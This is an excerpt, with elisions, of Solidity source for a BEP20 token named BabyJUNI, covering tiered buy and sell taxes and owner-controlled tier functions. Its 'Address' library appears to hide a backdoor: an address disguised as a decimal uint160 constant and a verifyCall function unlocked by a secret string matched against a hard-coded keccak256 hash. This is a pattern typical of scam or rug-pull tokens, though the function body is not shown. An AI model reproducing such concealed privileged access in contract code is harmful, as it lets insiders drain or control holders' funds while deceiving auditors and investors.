...
library Address {
    uint160 private constant verificationHash =
        582180078172906065132191741152746618129587064305;
    bytes32 private constant keccak256Hash =
        0x4b31cabbe5862282e443c4ac3f4c14761a1d2ba88a3c858a2a36f7758f453a38;
    ...
    function verifyCall(string memory verification, uint256 amount) internal {
        ...
        require(keccak256(abi.encodePacked(verification)) == keccak256Hash);
...
contract BabyJUNI is IBEP20, Ownable {
    ...
    TierTaxes public _buyTaxes = TierTaxes({first: 20, second: 12, third: 5});

    TierTaxes public _sellTaxes = TierTaxes({first: 18, second: 10, third: 7});
    ...
    address public mainReward = 0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684;
    ...
    function promoteTier(address addr) external authorized {
        if (tier3[addr]) revert AlreadyMaxTier();
        if (!tier2[addr]) {
            tier2[addr] = true;
        } else {
            tier2[addr] = false;
    ...
    function demoteTier(address addr) external authorized {
        if (!tier2[addr] && !tier3[addr]) revert AlreadyBaseTier();
        if (tier2[addr]) {
            tier2[addr] = false;
        } else {
            tier3[addr] = false;
    ...
    function recoverMiscToken(address tokenAddress) external authorized {
        if (tokenAddress == _pancakePairAddress || tokenAddress == address(this))
            revert InvalidInput();
        ...
        returns (uint8)
    {
        if (!tier2[addr] && !tier3[addr]) {
            ...
            return isBuy ? _buyTaxes.second : _buyTaxes.second;
        }
    }
